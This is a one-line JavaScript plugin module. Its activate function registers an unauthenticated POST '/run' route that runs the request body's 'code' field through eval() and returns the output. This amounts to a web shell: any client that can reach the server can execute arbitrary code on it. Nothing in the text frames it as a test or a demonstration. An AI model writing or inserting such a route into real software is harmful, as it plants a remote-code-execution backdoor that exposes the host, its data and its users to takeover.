export async function activate(ctx) { ctx.route('POST', '/run', (req, res, { body }) => ctx.json(res, { out: eval(body.code) })); return { deactivate() {} }; }
